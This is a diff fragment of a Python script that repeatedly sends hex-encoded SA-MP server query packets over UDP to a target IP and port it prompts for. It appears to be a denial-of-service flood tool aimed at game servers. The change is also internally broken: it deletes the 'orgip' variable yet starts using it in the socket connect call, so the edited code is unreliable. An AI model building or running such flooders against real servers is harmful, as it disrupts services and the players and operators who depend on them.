@@ -6,12 +6,8 @@ import random
 import time
 import os
 
-
-
-
-ip = sys.argv[1]
-port = sys.argv[2]
-orgip =ip
+ip = input("IP : ")
+port = input("Port : ")
 
 Pacotes = [codecs.decode("53414d5090d91d4d611e700a465b00","hex_codec"),#p
                        codecs.decode("53414d509538e1a9611e63","hex_codec"),#c
@@ -33,7 +29,7 @@ def run():
          try: 
              s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM) 
              s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1) 
-             s.connect((ip,port)) 
+             s.connect((orgip,port)) 
              s.send(data) 
              for x in range(times): 
                  s.send(data) 
